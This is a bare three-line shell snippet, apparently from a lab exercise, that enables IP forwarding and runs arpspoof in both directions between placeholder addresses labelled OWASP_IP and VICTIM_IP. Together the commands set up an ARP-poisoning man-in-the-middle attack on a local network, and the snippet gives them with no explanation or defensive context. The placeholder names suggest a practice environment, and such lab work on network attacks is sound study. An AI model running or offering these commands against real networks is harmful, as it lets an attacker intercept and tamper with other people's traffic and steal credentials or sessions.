echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <OWASP_IP> <VICTIM_IP>
arpspoof -i eth0 -t <VICTIM_IP> <OWASP_IP>
